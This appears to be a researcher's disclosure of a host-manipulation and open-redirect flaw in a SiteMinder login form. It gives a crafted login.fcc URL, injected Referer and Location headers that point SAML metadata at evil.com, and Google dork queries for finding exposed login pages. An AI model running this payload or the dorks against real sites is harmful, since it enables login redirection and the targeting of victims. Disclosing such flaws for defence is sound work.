# Host Manipulation Vulnerability

# Overview of the Vulnerability
This vulnerability is capable of injecting contents into the login form in a hidden way (<input type='hidden'), it also adds two reference fields capable of redirecting when performing a successful login.
<br> 
<br> 
                                                                                                
# Step to reproduce:
- On url, change a fields /siteminderagent/forms/login.fcc?TYPE=&REALMOID=&GUID=&SMAUTHREASON=0&METHOD=GET&SMAGENTNAME=&TARGET=-SM- {INJECT DOMAIN}
-  After adding a domain to your request, a new form of hidden type will be created automatically (<input type='hidden') and the following parameters will also be added to the request header:
<br> 
<br> 

```php
Referer: https:// {URL INJECT HERE} /affwebservices/secure/secureredirect/?SPID=https://evil.com/c2c/saml/metadata&SMPORTALURL=v%2FJaQcXcjv8i0itl6jA1r2S8TfHqIfZQoDq7oEUdb5QFATBYY04pvqJppw%2Bhp0fYSZ JogkCgh4WtuU4h7K%2BqsRXj1fSiLP1hcEFrVyXJ68piomV2582unvZkwlhmdLov&SAMLTRANSACTIONID=925291bf-e9f8e8a5-e00625ea-bb9766fe-40f1431d-dd
```
 <br> 
 
```php
Location: https:// {URL INJECT HERE} /affwebservices/secure/secureredirect/?SPID=https://evil.com/c2c/saml/metadata&SMPORTALURL=v%2FJaQcXcjv8i0itl6jA1r2S8TfHqIfZQoDq7oEUdb5QFATBYY04pvqJppw%2Bhp0fYSZJo gkCgh4WtuU4h7K%2BqsRXj1fSiLP1hcEFrVyXJ68piomV2582unvZkwlhmdLov&SAMLTRANSACTIONID=769a0761-7f79e2f5-35c4ace4-b9cccadc-f6d42b71-f
```
<br> 

# Proof of Concept:
## First Redirect (Secure Redirect)
<img src="https://i.imgur.com/jQtU2XL.png">

<br> 
<br> 

## Second Redirect (After Inject)
<img src="https://i.imgur.com/WsVUBw8.png">
<br>  
<br> 

# Google Hacking:
intitle:"SiteMinder Password Services"

inurl:"/siteminderagent/forms/login.fcc"

Researchers:
Ricardo Martins - A.K.A r00t1ng and Kayky Vinicius - A.K.A Divsz
